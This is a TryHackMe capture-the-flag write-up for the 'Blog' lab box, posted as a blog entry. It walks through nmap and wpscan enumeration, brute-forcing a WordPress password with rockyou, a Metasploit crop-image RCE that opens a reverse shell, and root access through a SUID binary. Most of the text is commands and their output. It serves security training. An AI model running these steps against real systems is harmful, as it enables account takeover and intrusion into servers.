@@ -1,0 +1,395 @@
+---
+layout: post
+title:  "Blog - TryHackMe"
+date:   2025-04-13 22:00:00 -0400
+categories: tryhackme writeup
+tags: medium
+---
+![Blog Banner](/assets/img/blog-banner.png)
+
+This medium-difficulty [TryHackMe](https://tryhackme.com) box creates a pretty realistic penetration testing scenario with a metasploitable web service, a SUID escalation, and a few rabbit holes to distract you. My favorite part was a brief disassembly exercise to determine the functionality of a mystery binary. Get your toolkit ready and follow along for a solution to Blog.
+
+> Please note: To comply with TryHackMe's write-up requirements, I've included a link to TryHackMe above and redacted all passwords, cracked hashes, and flags.
+{: .prompt-info }
+
+## Service Enumeration
+
+Let's start our recon with `nmap`.
+
+```
+sudo nmap -T4 -A blog.thm
+```
+
+```
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-12 22:08 EDT
+Nmap scan report for blog.thm (10.10.180.177)
+Host is up (0.11s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
+|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
+|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
+80/tcp  open  http        Apache httpd 2.4.29
+|_http-generator: WordPress 5.0
+|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
+| http-robots.txt: 1 disallowed entry
+|_/wp-admin/
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=4/12%OT=22%CT=1%CU=36274%PV=Y%DS=4%DC=T%G=Y%TM=67FB
+OS:1CD2%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=9)
+OS:SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M509ST11NW7%O2=M509S
+OS:T11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M509ST11NW7%O6=M509ST11)WIN(W1=
+OS:F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=
+OS:M509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
+OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
+OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=
+OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G
+OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 4 hops
+Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time:
+|   date: 2025-04-13T02:09:06
+|_  start_date: N/A
+|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: blog
+|   NetBIOS computer name: BLOG\x00
+|   Domain name: \x00
+|   FQDN: blog
+|_  System time: 2025-04-13T02:09:06+00:00
+
+TRACEROUTE (using port 587/tcp)
+HOP RTT       ADDRESS
+1   59.33 ms  10.6.0.1
+2   ... 3
+4   122.48 ms blog.thm (10.10.180.177)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.35 seconds
+```
+
+We have SSH, a web service, and some file shares to investigate. Pay close attention to the nmap scripts output for the web service. It will help you answer these task questions:
+
+- [x] What CMS was BIlly using?
+- [x] What version of the above CMS was being used?
+
+## Blog Enumeration
+
+Let's start with the blog. Loading the main page in a browser, we see a post from Billy Joel's mom: Karen Wheeler.
+
+![Blog Landing Page](/assets/img/blog-1.png)
+
+Our `nmap` scan identified the blog software as WordPress, so we can use the `wpscan` tool to probe for more information. I'll save you some time here and just say that the default scan doesn't provide anything useful. Our `nmap` scan _did_ identify the WordPress version and if we check exploit-db.com we'll find something that looks pretty promising.
+
+[WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)](https://www.exploit-db.com/exploits/46662)
+
+> This module exploits a path traversal and a local file inclusion vulnerability on WordPress versions 5.0.0 and <= 4.9.8. The crop-image function allows a user, with at least author privileges, to resize an image and perform a path traversal by changing the \_wp_attached_file reference during the upload. The second part of the exploit will include this image in the current theme by changing the \_wp_page_template attribute when creating a post.
+> 
+> This exploit module only works for Unix-based systems currently.
+
+According to the exploit description, we'll need a user with at least author privileges. Let's compromise a user account! We can use `wpscan` again to enumerate users for us.
+
+```
+wpscan --url http://blog.thm --enumerate u
+```
+
+```
+...
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:01 <=======================================================================================================================================> (10 / 10) 100.00% Time: 00:00:01
+
+[i] User(s) Identified:
+
+[+] kwheel
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] bjoel
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] Karen Wheeler
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By: Rss Generator (Aggressive Detection)
+
+[+] Billy Joel
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By: Rss Generator (Aggressive Detection)
+ ...
+```
+
+Okay! We have two users: Billy, and his mom Karen. Let's use `wpscan` again to brute-force a password.
+
+```
+wpscan --url http://blog.thm --passwords /usr/share/wordlists/rockyou.txt --usernames 'bjoel,kwheel'
+```
+
+```console
+...
+[SUCCESS] - kwheel / REDACTED
+```
+
+Billy used a strong password; but his mom didn't. Good news! If you log into the admin panel with Karen's account, you'll find she has author privileges.
+
+## Exploitation
+
+Fire up Metasploit! We're going to launch some exploits.
+
+```
+msfconsole
+```
+
+The exploit we want is called _multi/http/wp_crop_rce_.
+
+```
+use multi/http/wp_crop_rce
+```
+
+The options you'll want to set are `USERNAME` to `kwheel`, `PASSWORD` to Karen's password, and `RHOSTS` to your target.
+
+```
+set USERNAME kwheel
+```
+
+```
+set PASSWORD REDACTED
+```
+
+```
+set RHOSTS blog.thm
+```
+
+> A few things to note here:
+> 
+> I edit my _/etc/hosts_ file so I can refer to my target by name. That lets me set my `RHOSTS` to `blog.thm`, but you can just specify the IP address.
+> 
+> Note that the value for `PASSWORD` is redacted. You must substitute the brute-forced password here.
+> 
+> Lastly, check your `LHOST` value. Mine defaults to my local network IP address which won't allow the reverse shell to connect back. I set it using my TryHackMe VPN adapter name: `set LHOST tun0`
+{: .prompt-info }
+
+Run it!
+
+```
+run
+```
+
+```
+[*] Started reverse TCP handler on 10.6.30.85:4444
+[*] Authenticating with WordPress using kwheel:REDACTED...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload
+[+] Image uploaded
+[*] Including into theme
+[*] Sending stage (39927 bytes) to 10.10.80.143
+[*] Meterpreter session 1 opened (10.6.30.85:4444 -> 10.10.80.143:51572) at 2022-12-24 15:10:39 -0500
+[*] Attempting to clean up files...
+
+meterpreter >
+```
+
+## Post-Exploitation
+
+We're in! We have a PHP reverse shell into the target.
+
+```
+meterpreter > shell
+Process 1840 created.
+Channel 1 created.
+dir
+hSteQAxeEn.php   wp-blog-header.php    wp-includes        wp-signup.php
+index.php        wp-comments-post.php  wp-links-opml.php  wp-trackback.php
+license.txt      wp-config-sample.php  wp-load.php        xmlrpc.php
+readme.html      wp-config.php         wp-login.php
+wp-activate.php  wp-content            wp-mail.php
+wp-admin         wp-cron.php           wp-settings.php
+
+whoami
+www-data
+
+ls /home
+bjoel
+
+cd /home/bjoel
+ls -al
+total 100
+drwxr-xr-x 4 bjoel bjoel  4096 May 26  2020 .
+drwxr-xr-x 3 root  root   4096 May 26  2020 ..
+lrwxrwxrwx 1 root  root      9 May 26  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 bjoel bjoel   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 bjoel bjoel  3771 Apr  4  2018 .bashrc
+drwx------ 2 bjoel bjoel  4096 May 25  2020 .cache
+drwx------ 3 bjoel bjoel  4096 May 25  2020 .gnupg
+-rw-r--r-- 1 bjoel bjoel   807 Apr  4  2018 .profile
+-rw-r--r-- 1 bjoel bjoel     0 May 25  2020 .sudo_as_admin_successful
+-rw-r--r-- 1 bjoel bjoel 69106 May 26  2020 Billy_Joel_Termination_May20-2020.pdf
+-rw-r--r-- 1 bjoel bjoel    57 May 26  2020 user.txt
+
+cat user.txt
+You won't find what you're looking for here.
+
+TRY HARDER
+```
+
+Looking around a bit, we discover we are the `www-data` user, there's an OS user with the same name as the WordPress user for Billy: `bjoel`, and there's a false user flag in his home directory.
+
+There are a few rabbit holes here, including the network shares we've ignored so far. Instead, we're going to look for a privilege escalation. I like to use [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) as it grabs a lot of information about the system I can dig through.
+
+After executing LinPEAS on the remote host and looking through the output, a couple of sections stuck out to me.
+
+```
+╔══════════╣ Analyzing Wordpress Files (limit 70)
+-rw-r----- 1 www-data www-data 3279 May 28  2020 /var/www/wordpress/wp-config.php
+define('DB_NAME', 'blog');
+define('DB_USER', 'wordpressuser');
+define('DB_PASSWORD', 'REDACTED');
+define('DB_HOST', 'localhost');
+```
+
+We could get into the database and try to shell out from there, but we'd just be pivoting to whatever user is running the database. We're currently trying to get `root` or `bjoel` access, so let's keep looking.
+
+```
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
+-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
+-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-sr-x 1 root root 8.3K May 26  2020 /usr/sbin/checker (Unknown SUID binary!)
+-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-- 1 root messagebus 42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-sr-x 1 root root 107K Oct 30  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 43K Mar  5  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 27K Mar  5  2020 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root root 40K Oct 10  2019 /snap/core/8268/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8268/bin/ping
+-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8268/bin/ping6
+-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8268/bin/su
+-rwsr-xr-x 1 root root 27K Oct 10  2019 /snap/core/8268/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/8268/usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8268/usr/bin/chsh
+-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/8268/usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/8268/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 134K Oct 11  2019 /snap/core/8268/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 419K Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
+-rwsr-sr-x 1 root root 105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-- 1 root dip 386K Jun 12  2018 /snap/core/8268/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+-rwsr-xr-x 1 root root 40K Jan 27  2020 /snap/core/9066/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/9066/bin/ping
+-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/9066/bin/ping6
+-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/9066/bin/su
+-rwsr-xr-x 1 root root 27K Jan 27  2020 /snap/core/9066/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/9066/usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/9066/usr/bin/chsh
+-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/9066/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/9066/usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/9066/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 134K Jan 31  2020 /snap/core/9066/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-- 1 root systemd-resolve 42K Nov 29  2019 /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 419K Mar  4  2019 /snap/core/9066/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 109K Apr 10  2020 /snap/core/9066/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-- 1 root dip 386K Feb 11  2020 /snap/core/9066/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+```
+
+Did you catch the oddity in this section?
+
+```
+-rwsr-sr-x 1 root root 8.3K May 26  2020 /usr/sbin/checker (Unknown SUID binary!)
+```
+
+## Privilege Escalation
+
+If you run it directly from your shell, it prints the message: "Not an Admin". Weird. What the hell is this thing? Let's pull it down to our attack box and examine it. You can do this from the Meterpreter command line (not your shell).
+
+```
+download /usr/sbin/checker .
+```
+
+Use your tool of choice for disassembly. I used Ghidra and it translated the assembly to this C code.
+
+```
+undefined8 main(void)
+
+{
+  char *pcVar1;
+  
+  pcVar1 = getenv("admin");
+  if (pcVar1 == (char *)0x0) {
+    puts("Not an Admin");
+  }
+  else {
+    setuid(0);
+    system("/bin/bash");
+  }
+  return 0;
+}
+```
+
+Pretty simple. This `checker` binary examines the `admin` environment variable. If it's empty, it prints "Not an Admin". Otherwise, it makes you root and starts a new bash shell. Let's test it! Back in your reverse shell, set an environment variable named `admin` to any value.
+
+```
+export admin=1
+```
+
+Then run `checker`.
+
+```
+/usr/sbin/checker
+whoami
+root
+```
+
+Excellent. Now all that's left is to collect our flags.
+
+```
+cat /root/root.txt
+REDACTED
+```
+
+But where was the real user flag? If you ventured down one of the rabbit holes, you'd learn that Billy got fired for repeated offenses regarding the company removable media policy. Use the `find` command as root to locate and collect the last flag; and answer the remaining task question "Where was user.txt found?".
+
+```
+find / -name user.txt 2>/dev/null
+```
